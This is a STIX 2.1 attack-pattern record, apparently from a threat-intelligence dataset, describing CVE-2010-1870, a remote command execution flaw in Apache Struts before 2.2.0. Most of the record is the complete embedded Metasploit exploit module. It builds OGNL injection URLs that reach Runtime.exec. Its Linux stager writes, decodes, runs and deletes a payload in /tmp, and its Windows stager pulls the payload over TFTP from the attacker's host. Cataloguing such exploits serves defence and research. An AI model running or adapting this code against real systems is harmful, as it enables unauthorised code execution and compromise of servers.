{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f228f73b-7e8f-45d0-8643-adeef62d3f2d",
    "created": "2024-08-14T17:10:42.165047Z",
    "modified": "2024-08-14T17:10:42.16505Z",
    "name": "Apache Struts Remote Command Execution",
    "description": " This module exploits a remote command execution vulnerability in Apache Struts versions < 2.2.0. This issue is caused by a failure to properly handle unicode characters in OGNL extensive expressions passed to the web server.  By sending a specially crafted request to the Struts application it is possible to bypass the \"#\" restriction on ParameterInterceptors by using OGNL context variables. Bypassing this restriction allows for the execution of arbitrary Java code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/struts_code_exec.rb",
            "external_id": "struts_code_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-1870"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apache Struts Remote Command Execution',\n      'Description'    => %q{\n          This module exploits a remote command execution vulnerability in\n        Apache Struts versions < 2.2.0. This issue is caused by a failure to properly\n        handle unicode characters in OGNL extensive expressions passed to the web server.\n\n          By sending a specially crafted request to the Struts application it is possible to\n        bypass the \"#\" restriction on ParameterInterceptors by using OGNL context variables.\n        Bypassing this restriction allows for the execution of arbitrary Java code.\n      },\n      'Author'         =>\n        [\n          'bannedit', # metasploit module\n          'Meder Kydyraliev', # original public exploit\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2010-1870'],\n          [ 'OSVDB', '66280'],\n          [ 'EDB', '14360' ],\n        ],\n      'Platform'      => %w{ linux win },\n      'Privileged'     => true,\n      'Targets'        =>\n        [\n          ['Windows Universal',\n            {\n                'Arch' => ARCH_X86,\n                'Platform' => 'win',\n                'CmdStagerFlavor' => 'tftp'\n            }\n          ],\n          ['Linux Universal',\n            {\n                'Arch' => ARCH_X86,\n                'Platform' => 'linux'\n            }\n          ],\n        ],\n      'DisclosureDate' => '2010-07-13',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('URI', [ true, 'The path to a struts application action ie. /struts2-blank-2.0.9/example/HelloWorld.action', \"\"]),\n        OptString.new('CMD', [ false, 'Execute this command instead of using command stager', \"\" ])\n      ])\n\n    self.needs_cleanup = true\n  end\n\n  def execute_command(cmd, opts = {})\n    uri =   normalize_uri(datastore['URI'])\n    uri =   Rex::Text::uri_encode(uri)\n    var_a = rand_text_alpha_lower(4)\n    var_b = rand_text_alpha_lower(2)\n    var_c = rand_text_alpha_lower(4)\n    var_d = rand_text_alpha_lower(4)\n    var_e = rand_text_alpha_lower(4)\n\n    uri << \"?(%27\\\\u0023_memberAccess[\\\\%27allowStaticMethodAccess\\\\%27]%27)(#{var_a})=true&\"\n    uri << \"(aaaa)((%27\\\\u0023context[\\\\%27xwork.MethodAccessor.denyMethodExecution\\\\%27]\\\\u003d\\\\u0023#{var_c}%27)(\\\\u0023#{var_c}\\\\u003dnew%20java.lang.Boolean(\\\"false\\\")))&\"\n    uri << \"(#{var_b})((%27\\\\u0023#{var_d}.exec(\\\"CMD\\\")%27)(\\\\u0023#{var_d}\\\\u003d@java.lang.Runtime@getRuntime()))=1\" if target['Platform'] == 'win'\n    uri << \"(asdf)(('\\\\u0023rt.exec(\\\"CMD\\\".split(\\\"@\\\"))')(\\\\u0023rt\\\\u003d@java.lang.Runtime@getRuntime()))=1\" if target['Platform'] == 'linux'\n    uri.gsub!(/CMD/, Rex::Text::uri_encode(cmd))\n\n    vprint_status(\"Attempting to execute: #{cmd}\")\n\n    resp = send_request_raw({\n      'uri'     => uri,\n      'version' => '1.1',\n      'method'  => 'GET',\n    }, 5)\n  end\n\n  def windows_stager\n    print_status(\"Sending request to #{datastore['RHOST']}:#{datastore['RPORT']}\")\n    tftphost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']\n    execute_cmdstager({ temp: '.', tftphost: tftphost })\n    @payload_exe = generate_payload_exe\n\n    print_status(\"Attempting to execute the payload...\")\n    execute_command(@payload_exe)\n  end\n\n  def linux_stager\n    cmds = \"/bin/sh@-c@echo LINE | tee FILE\"\n    exe = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)\n    base64 = Rex::Text.encode_base64(exe)\n    base64.gsub!(/\\=/, \"\\\\u003d\")\n    file = rand_text_alphanumeric(4+rand(4))\n\n    execute_command(\"/bin/sh@-c@touch /tmp/#{file}.b64\")\n    cmds.gsub!(/FILE/, \"/tmp/\" + file + \".b64\")\n    base64.each_line do |line|\n      line.chomp!\n      cmd = cmds\n      cmd.gsub!(/LINE/, line)\n      execute_command(cmds)\n    end\n\n    execute_command(\"/bin/sh@-c@base64 -d /tmp/#{file}.b64|tee /tmp/#{file}\")\n    execute_command(\"/bin/sh@-c@chmod +x /tmp/#{file}\")\n    execute_command(\"/bin/sh@-c@rm /tmp/#{file}.b64\")\n\n    execute_command(\"/bin/sh@-c@/tmp/#{file}\")\n    @payload_exe = \"/tmp/\" + file\n  end\n\n  def on_new_session(client)\n    if target['Platform'] == 'linux'\n      print_warning(\"Deleting #{@payload_exe} payload file\")\n      execute_command(\"/bin/sh@-c@rm #{@payload_exe}\")\n    else\n      print_status(\"Windows does not allow running executables to be deleted\")\n      print_status(\"Delete the #{@payload_exe} file manually after migrating\")\n    end\n  end\n\n  def exploit\n    unless datastore['CMD'].blank?\n      print_status(\"Executing user supplied command\")\n      execute_command(datastore['CMD'])\n      return\n    end\n\n    case target['Platform']\n      when 'linux'\n        linux_stager\n      when 'win'\n        windows_stager\n      else\n        fail_with(Failure::NoTarget, 'Unsupported target platform!')\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-07-13",
    "x_mitre_platforms": [
        "linux"
    ]
}